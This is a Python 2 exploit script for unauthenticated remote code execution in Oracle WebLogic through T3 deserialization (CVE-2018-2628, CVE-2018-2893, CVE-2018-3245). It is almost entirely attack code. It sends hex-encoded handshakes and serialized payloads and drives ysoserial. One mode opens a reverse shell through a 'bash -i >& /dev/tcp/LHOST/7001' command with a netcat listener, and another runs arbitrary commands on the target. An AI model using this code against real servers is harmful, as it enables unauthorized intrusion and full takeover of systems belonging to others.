#!/usr/bin/python

# This code exploits the CVE-2018-2628, CVE-2018-2893 and CVE-2018-3245 unauthenticated RCE vulnerability in WebLogic
# 
# 
# http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html
# https://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html
# https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html
# https://www.waratek.com/oracle-weblogic-rce-deserialization-vulnerability-cve-2018-2628-analysis/
# https://github.com/pyn3rd/CVE-2018-3245
# The vulnerability affects supported versions:
# 10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3
#Tested on docker https://hub.docker.com/r/ismaleiva90/weblogic12/  (12.1.3.0)
#Tested on docker https://hub.docker.com/r/zhiqzhao/ubuntu_weblogic1036_domain/   (10.3.6.0)

# Information for building the exploit was taken from here: https://github.com/MrTcsy/Exploit
# The exploit works with 'ysoserial-cve-2018-3245.jar' which is a modified version of ysoserial catered to the weblogic deserialization vulnerabilities
# More details can be found here: https://github.com/pyn3rd/CVE-2018-3245

# Dunstan Pinto, 31/10/2018 (dunstan.pinto@gmail.com)


import socket
import sys
import time
import os
import re

def t3_handshake(sock,server_addr):
    sock.connect(server_addr)
    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
    time.sleep(1)
    sock.recv(1024)
    print 't3 handshake successful'

def build_t3_request_object(sock, port):
    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))
    data3 = '1a7727000d3234322e323134'
    data4 = '2e312e32353461863d1d0000000078'
    for d in [data1,data2,data3,data4]:
        sock.send(d.decode('hex'))
    time.sleep(5)
    print 'send t3 request object successful,recv length:%d'%(len(sock.recv(2048)))


def send_payload_objdata(sock,data):
    payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
    payload+=data
    payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
    sock.send(payload.decode('hex'))
    time.sleep(2)
    sock.send(payload.decode('hex'))
    res = ''
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
    except Exception as e:
        pass
    return res


#function to get a reverse shell
def rs(dip,dport,switch,sip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(50)
    server_addr = (dip, dport)
    print "Select the weblogic deserialization exploit"
    jpayload = raw_input("1. CVE-2018-2628\n2. CVE-2018-2893\n3. CVE-2018-3245\n")
    if jpayload == '1':
        print "Exploiting CVE-2018-2628"
        t3_handshake(sock,server_addr)
        build_t3_request_object(sock,dport)     
        print 'Generating ysoserial payload for CVE-2018-2628'
        os.system("mate-terminal --command 'java -cp ysoserial-cve-2018-3245.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{}/7001 0>&1\"'".format(sip))
        time.sleep(3)
        print 'Trying to get a reverse shell'
        PAYLOAD=os.popen(("java -jar ysoserial-cve-2018-3245.jar CVE_2018_2893_1 {}:1099 | xxd -p -c 1000000").format(sip)).read()
        PAYLOAD=PAYLOAD.strip()
        print 'Sending final payload'
        #spawning a new terminal window for the netcat listener
        os.system("mate-terminal --command 'nc -lvp 7001'")
        send_payload_objdata(sock,PAYLOAD)
        print 'Exploit completed Successfully'
    if jpayload == '2':
        print "Exploiting CVE-2018-2893"
        t3_handshake(sock,server_addr)
        build_t3_request_object(sock,dport)     
        print 'Generating ysoserial payload for CVE-2018-2893'
        os.system("mate-terminal --command 'java -cp ysoserial-cve-2018-3245.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{}/7001 0>&1\"'".format(sip))
        time.sleep(3)
        print 'Trying to get a reverse shell'
        PAYLOAD=os.popen(("java -jar ysoserial-cve-2018-3245.jar CVE_2018_2893_3 {}:1099 | xxd -p -c 1000000").format(sip)).read()
        PAYLOAD=PAYLOAD.strip()
        print 'Sending final payload'
        #spawning a new terminal window for the netcat listener
        os.system("mate-terminal --command 'nc -lvp 7001'")
        send_payload_objdata(sock,PAYLOAD)
        print 'Exploit completed Successfully'
    if jpayload == '3':
        print "Exploiting CVE-2018-3245"
        t3_handshake(sock,server_addr)
        build_t3_request_object(sock,dport)     
        print 'Generating ysoserial payload for CVE-2018-3245'
        os.system("mate-terminal --command 'java -cp ysoserial-cve-2018-3245.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 \"bash -c $@|bash . echo bash -i >& /dev/tcp/{}/7001 0>&1\"'".format(sip))
        time.sleep(3)
        print 'Trying to get a reverse shell'
        PAYLOAD=os.popen(("java -jar ysoserial-cve-2018-3245.jar CVE_2018_3245 {}:1099 | xxd -p -c 1000000").format(sip)).read()
        PAYLOAD=PAYLOAD.strip()
        print 'Sending final payload'
        #spawning a new terminal window for the netcat listener
        os.system("mate-terminal --command 'nc -lvp 7001'")
        send_payload_objdata(sock,PAYLOAD)
        print 'Exploit completed Successfully'
    else:
        print "Select the correct option\n1. CVE-2018-2628\n2. CVE-2018-2893\n3. CVE-2018-3245"

#function to run arbitrary commands on the server
def run(dip,dport,switch,cmd,sip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(50)
    server_addr = (dip, dport)
    print "Select the weblogic deserialization exploit"
    jpayload = raw_input("1. CVE-2018-2628\n2. CVE-2018-2893\n3. CVE-2018-3245\n")
    if jpayload == '1':
        print "Exploiting CVE-2018-2628"
        t3_handshake(sock,server_addr)
        build_t3_request_object(sock,dport)
        print 'Generating ysoserial payload for CVE-2018-2628'
        os.system("mate-terminal --command 'java -cp ysoserial-cve-2018-3245.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 \"{}\"'".format(cmd))
        time.sleep(3)
        print 'Trying to run the command '+sys.argv[4]
        PAYLOAD=os.popen(("java -jar ysoserial-cve-2018-3245.jar CVE_2018_2893_1 {}:1099 | xxd -p -c 1000000").format(sip)).read()
        PAYLOAD=PAYLOAD.strip()
        print 'Sending final payload'
        evil_return_data = send_payload_objdata(sock,PAYLOAD)
        print 'Exploit completed Successfully'
    if jpayload == '2':
        print "Exploiting CVE-2018-2893"
        t3_handshake(sock,server_addr)
        build_t3_request_object(sock,dport)
        print 'Generating ysoserial payload for CVE-2018-2893'
        os.system("mate-terminal --command 'java -cp ysoserial-cve-2018-3245.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 \"{}\"'".format(cmd))
        time.sleep(3)
        print 'Trying to run the command '+sys.argv[4]
        PAYLOAD=os.popen(("java -jar ysoserial-cve-2018-3245.jar CVE_2018_2893_3 {}:1099 | xxd -p -c 1000000").format(sip)).read()
        PAYLOAD=PAYLOAD.strip()
        print 'Sending final payload'
        evil_return_data = send_payload_objdata(sock,PAYLOAD)
        print 'Exploit completed Successfully'
    if jpayload == '3':
        print "Exploiting CVE-2018-3245"
        t3_handshake(sock,server_addr)
        build_t3_request_object(sock,dport)
        print 'Generating ysoserial payload for CVE-2018-3245'
        os.system("mate-terminal --command 'java -cp ysoserial-cve-2018-3245.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 \"{}\"'".format(cmd))
        time.sleep(3)
        print 'Trying to run the command '+sys.argv[4]
        PAYLOAD=os.popen(("java -jar ysoserial-cve-2018-3245.jar CVE_2018_3245 {}:1099 | xxd -p -c 1000000").format(sip)).read()
        PAYLOAD=PAYLOAD.strip()
        print 'Sending final payload'
        send_payload_objdata(sock,PAYLOAD)
        print 'Exploit completed Successfully'
    else:
        print "Select the correct option\n1. CVE-2018-2628\n2. CVE-2018-2893\n3. CVE-2018-3245"


if __name__=="__main__":
    try:
        dip = sys.argv[1]
        dport = int(sys.argv[2])
        switch = sys.argv[3]
        if switch == '-rs':
            try:                
                sip = sys.argv[4]
                rs(dip,dport,switch,sip)
            except IndexError:
                print 'Usage: python weblogic_dser.py <RHOST> <PORT> -rs <LHOST>'
        elif switch == '-c':
            try:

                cmd = sys.argv[4]
                sip = sys.argv[5]
                
                run(dip,dport,switch,cmd,sip)
            except IndexError:
                print "Usage: python weblogic_dser.py <RHOST> <PORT> -c '<command>' <LHOST>"
        else:
            print "Use the -c switch to execute an arbitrary command on the weblogic server, for e.g.: python weblogic_dser.py <RHOST> <PORT> -c '<command>'"
            print "Use the -rs switch to get a reverse shell, for e.g.: python weblogic_dser.py <RHOST> <PORT> -rs <LHOST>"
    except IndexError:
        print "Use the -c switch to execute an arbitrary command on the weblogic server, for e.g.: python weblogic_dser.py <RHOST> <PORT> -c '<command>'"
        print "Use the -rs switch to get a reverse shell, for e.g.: python weblogic_dser.py <RHOST> <PORT> -rs <LHOST>"


        
